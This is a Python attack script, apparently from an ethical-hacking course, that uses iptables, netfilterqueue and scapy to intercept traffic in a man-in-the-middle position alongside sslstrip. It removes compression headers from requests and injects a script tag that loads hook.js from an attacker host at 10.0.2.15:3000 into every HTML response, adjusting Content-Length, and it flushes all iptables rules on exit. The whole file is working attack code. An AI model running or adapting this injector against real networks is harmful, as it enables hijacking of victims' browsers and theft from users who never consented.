#!/usr/bin/env python
import argparse
import sys
import netfilterqueue
import scapy.all as scapy
import subprocess
import re

queue_number = 0


def get_arguments():

    return 0


def create_queue():
    # targeting
    # subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num ' + str(queue_number), shell=True)
    # local
    # subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num ' + str(queue_number), shell=True)
    # subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num ' + str(queue_number), shell=True)
    # ssl strip
    subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)


def remove_queue():
    subprocess.call('iptables --flush', shell=True)


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = str(scapy_packet[scapy.Raw].load)
            if scapy_packet[scapy.TCP].dport == 10000:  # ssl strip
                # if scapy_packet[scapy.TCP].dport == 80:  # Leaving
                print('[+] Request')
                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
                # load = load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapy_packet[scapy.TCP].sport == 10000:  # ssl strip
                # elif scapy_packet[scapy.TCP].sport == 80:  # Response
                print('[+] Response')
                # print(scapy_packet.show())
                load = load.replace('</body>', injection_code + '</body>')
                content_length_search = re.search('(?:Content-Length:\\s)(\\d*)', load)
                if content_length_search and 'text/html' in load:
                    content_length = content_length_search.group(1)
                    load = load.replace(content_length, str(int(content_length) + len(injection_code)))
                    print('[+] ************************* LOAD ***************************'
                          + load)

            if load != scapy_packet[scapy.Raw].load:
                modified_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(modified_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()


args = get_arguments()

create_queue()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(queue_number, process_packet)
    queue.run()
except KeyboardInterrupt:
    print('\n[-] Detected CTRL + C:')
except Exception:
    e = sys.exc_info()[0]
    print('[-] Exception: ' + e)
finally:
    print('...... Resetting ip tables. Please wait ...')
    remove_queue()
